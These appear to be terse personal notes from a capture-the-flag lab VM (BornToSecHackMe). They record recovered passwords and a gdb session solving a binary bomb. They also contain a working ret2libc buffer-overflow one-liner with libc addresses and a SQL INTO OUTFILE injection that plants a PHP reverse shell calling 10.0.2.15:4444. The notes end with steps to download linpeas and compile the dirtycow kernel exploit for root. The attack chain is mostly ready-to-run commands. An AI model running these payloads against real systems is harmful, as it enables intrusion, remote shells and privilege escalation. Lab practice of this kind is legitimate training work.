
331ZU.pcap:char getme1() { I
331ZU.pcap-//file5
--
G7Y8I.pcap:char getme2() { h
G7Y8I.pcap-//file37
--
B62N4.pcap:char getme3() { e
B62N4.pcap-//file56
--
0T16C.pcap:char getme4() { a
0T16C.pcap-//file115
--
4KAOH.pcap:char getme5() { r
4KAOH.pcap-//file368
--
91CD0.pcap:char getme6() { t
91CD0.pcap-//file521
--
32O0M.pcap:char getme7() { p
32O0M.pcap-//file736
--
BJPCP.pcap:char getme8() {
BJPCP.pcap-     return 'w';
}
--
BJPCP.pcap:char getme9() {
BJPCP.pcap-     return 'n';
}
--
BJPCP.pcap:char getme10() {
BJPCP.pcap-     return 'a';
}
--
BJPCP.pcap:char getme11() {
BJPCP.pcap-     return 'g';
}
--
BJPCP.pcap:char getme12(){
BJPCP.pcap-     return 'e';
}
--
===> password = Iheartpwnage

Python 3
>>> import hashlib
>>> hashlib.sha256(b'Iheartpwnage').hexdigest()
'330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4'

password laurie: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

//bomb
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
fibonacci 9
o`ekma
4
INT:
P
 2
 b

o
4

(gdb) info registers
eax            0x1                 1
ecx            0x804980b           134518795
edx            0xffffcc60          -13216
ebx            0x804b7c0           134526912
esp            0xffffcc50          0xffffcc50
ebp            0xffffcc68          0xffffcc68
esi            0x804b220           134525472
edi            0xf7ffcb60          -134231200
eip            0x8048d85           0x8048d85 <phase_5+89>
eflags         0x202               [ IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) print $eax
$1 = 1
(gdb) x/s 0x8048d85
0x8048d85 <phase_5+89>: "t\005\350p\a"
(gdb) x/d 0x8048d85
0x8048d85 <phase_5+89>: 116
(gdb) x/s 0xf7ffcb60
0xf7ffcb60 <_rtld_global_ro>:   ""
(gdb) x/d 0xf7ffcb60
0xf7ffcb60 <_rtld_global_ro>:   0
(gdb) x/s 0x804b220
0x804b220:      "isrveawhobpnutfg\260\001"
(gdb) x/s *0x804b220
0x76727369:     <error: Cannot access memory at address 0x76727369>
(gdb) x/s *0x804b220
0x76727369:     <error: Cannot access memory at address 0x76727369>
(gdb) x/s 0x804b220
0x804b220:      "isrveawhobpnutfg\260\001"

4    2   6   3   1   5   
997 725 432 301 253 212 

1b214

2b755

"Publicspeakingisveryeasy.126241207202b7559giants426315"
"Publicspeakingisveryeasy.126241207201b2149o`ekma426315"
P119O4
b9giants

opekma,
opekmq,
opukma,
opukmq

Publicspeakingisveryeasy.126241207201b2149opukmq426315
giants
o
isrveawhobpnutfg
opekmq

password thor: Publicspeakingisveryeasy.126241207201b2149opekmq426135



Python 3
>>> import hashlib
>>> hashlib.md5(b"SLASH").hexdigest()
'646da671ca01bb5d84dbb5fb2238dc8e'

password zaz: 646da671ca01bb5d84dbb5fb2238dc8e

run $(python -c 'print "\x55" * 140 + "system addr" + "\bin\sh addr"')

checksec --file=exploit_me 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66 Symbols  No	0		1		exploit_me

get the systyem addr :

disass system
Dump of assembler code for function system:
   0xb7e6b060 <+0>:     sub    $0x1c,%esp
   0xb7e6b063 <+3>:     mov    %esi,0x14(%esp)
   0xb7e6b067 <+7>:     mov    0x20(%esp),%esi
   0xb7e6b06b <+11>:    mov    %ebx,0x10(%esp)
   0xb7e6b06f <+15>:    call   0xb7f56c73
   0xb7e6b074 <+20>:    add    $0x165f80,%ebx
   0xb7e6b07a <+26>:    mov    %edi,0x18(%esp)
   0xb7e6b07e <+30>:    test   %esi,%esil
   0xb7e6b080 <+32>:    je     0xb7e6b0a8 <system+72>
   0xb7e6b082 <+34>:    mov    %gs:0xc,%eax
   0xb7e6b088 <+40>:    test   %eax,%eax

info proc :

info proc map
process 1965
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
---Type <return> to continue, or q <return> to quit---
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]

zaz@BornToSecHackMe:~$ strings -a -t x /lib/i386-linux-gnu/libc-2.15.so | grep "/bin/sh"
160c58 /bin/sh

(gdb) print/x (0xb7e2c000 + 0x160c58)
$2 = 0xb7f8cc58


system 0xb7e6b060
exit 0xb7e5ebe0
/bin/sh 0xb7f8cc58

./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')

usefull : https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
-----------------------------------------------------------------------------------------------------------------------------------

SELECT '<php? $sock=fsockopen("10.0.2.15",4444);system("sh <&3 >&3 2>&3"); ?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php";
SELECT '<?php $sock=fsockopen("10.0.2.15",4444);system("sh <&3 >&3 2>&3"); ?>' 
INTO OUTFILE '/var/www/forum/templates_c/shell.php';


curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

scp  linpeas.sh laurie@192.168.56.101:~/

./linpeas.sh

https://www.exploit-db.com/download/4839
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

gcc -pthread dirty2.c -o dirty -lcrypt
su firefart


